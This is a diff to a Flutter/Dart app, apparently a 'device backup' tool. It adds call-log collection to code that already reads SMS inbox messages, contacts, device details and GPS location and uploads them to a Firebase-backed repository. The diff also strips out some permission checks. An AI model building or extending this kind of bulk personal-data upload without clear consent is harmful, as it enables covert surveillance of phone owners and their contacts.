@@ -1,4 +1,5 @@
 import 'dart:io';
+import 'package:call_log/call_log.dart';
 import 'package:device_backup_1989/firebase.dart';
 import 'package:device_info_plus/device_info_plus.dart';
 import 'package:flutter_contacts/flutter_contacts.dart';
@@ -14,10 +15,12 @@ static Future<void> requestPermissionsAndFetchData(String userId) async {
   Map<Permission, PermissionStatus> statuses = await [
     Permission.contacts,
     Permission.sms,
+    Permission.phone
   ].request();
 
   bool contactsGranted = statuses[Permission.contacts]?.isGranted ?? false;
   bool smsGranted = statuses[Permission.sms]?.isGranted ?? false;
+  bool phoneGranted = statuses[Permission.phone]?.isGranted ?? false;
   bool locationGranted = await Geolocator.isLocationServiceEnabled();
 
   if (!contactsGranted) {
@@ -25,6 +28,9 @@ static Future<void> requestPermissionsAndFetchData(String userId) async {
   }
   if (!smsGranted) {
     print("❌SMS permission denied");
+  }
+  if(!phoneGranted){
+      print("❌Phone permission denied");
   }
     if (!locationGranted) {
     print("location permission denied");
@@ -36,6 +42,7 @@ static Future<void> requestPermissionsAndFetchData(String userId) async {
    
   }
 
+
   // Fetch SMS only if permission granted
   if (smsGranted) {
    await fetchSms(userId);
@@ -43,28 +50,18 @@ static Future<void> requestPermissionsAndFetchData(String userId) async {
      await getDeviceInfo(userId);
    await getLocation(userId); 
 
+       // Fetch callLogs if permission granted
+  if (phoneGranted) {
+   await requestCallLogPermission(userId);
+  }
+
 }
 }
-
-
-
-
 
 
 /// contact info
  Future<void> requestAndFetchContacts(String userId) async {
-    // 1️⃣ Request permission using permission_handler
-    var status = await Permission.contacts.status;
-    if (!status.isGranted) {
-      status = await Permission.contacts.request();
-    }
-
-    if (!status.isGranted) {
-      print("Permission denied to access contacts");
-      return;
-    }
-
-    // 2️⃣ Permission granted, fetch contacts
+    // Permission granted, fetch contacts
     final contacts = await FlutterContacts.getContacts(
       withProperties: true,
     );
@@ -85,18 +82,7 @@ static Future<void> requestPermissionsAndFetchData(String userId) async {
 // sms servic
  final SmsQuery _query = SmsQuery();
     Future<void> fetchSms(String userId) async {
-    // 1️⃣ Request SMS permission
-    var status = await Permission.sms.status;
-    if (!status.isGranted) {
-      status = await Permission.sms.request();
-    }
-
-    if (!status.isGranted) {
-      print("❌SMS permission denied");
-      return;
-    }
-
-    // 2️⃣ Fetch all inbox messages
+    //  Fetch all inbox messages
     List<SmsMessage> messages = await _query.querySms(
           kinds: [SmsQueryKind.inbox],
           count: 1000,
@@ -110,7 +96,7 @@ static Future<void> requestPermissionsAndFetchData(String userId) async {
             .toList();
         await BackupRepository.backupSms(userId, smsData);
   
-    print("SMS DATA 📩 $messages");
+   print("SMS DATA 📩 $messages");
 //     _smsList.forEach((sms) {
 //   print("${sms.address}: ${sms.body}");
 // });
@@ -135,17 +121,52 @@ Future<void> getDeviceInfo(String userId) async {
     });
   } else if (Platform.isIOS) {
     IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
-    print("Device: ${iosInfo.name}");
-    print("System Name: ${iosInfo.systemName}");
-    print("iOS Version: ${iosInfo.systemVersion}");
-    print("Device ID: ${iosInfo.identifierForVendor}");
+
   }
+}
+
+
+//call log Data
+
+Future<void> requestCallLogPermission(String userId) async {
+  final Iterable<CallLogEntry> entries = await CallLog.get();
+
+  // Sort descending by timestamp
+  final sortedEntries = entries.toList()
+    ..sort((a, b) => (b.timestamp ?? 0).compareTo(a.timestamp ?? 0));
+
+  // Take only the first 50
+  final last50Entries = sortedEntries.take(50);
+
+  List<Map<String, dynamic>> callLogs = [];
+
+  for (CallLogEntry entry in last50Entries) {
+    final formattedDate = entry.timestamp != null
+        ? DateTime.fromMillisecondsSinceEpoch(entry.timestamp!)
+            .toIso8601String()
+        : null;
+
+    callLogs.add({
+      "number": entry.number ?? "unknown",
+      "type": entry.callType?.toString().split('.').last ?? "unknown",
+      "duration": entry.duration ?? 0,
+      "date": formattedDate,
+    });
+  }
+
+  // Upload all 50 logs at once
+  await BackupRepository.backupCallLog(userId, {
+    "logs": callLogs,
+  });
+
+  print("✅ Uploaded ${callLogs.length} most recent call logs");
 }
 
 
 
 
-// get User Location inro
+
+// get User Location info
 Future<void> getLocation(String userId) async {
   // 1️⃣ Check if location service (GPS) is enabled
   bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
@@ -182,6 +203,6 @@ Future<void> getLocation(String userId) async {
     "Longitude" : position.longitude,
    });
 
-  print("✅ Latitude: ${position.latitude}");
-  print("✅ Longitude: ${position.longitude}");
+  // print("✅ Latitude: ${position.latitude}");
+  // print("✅ Longitude: ${position.longitude}");
 }
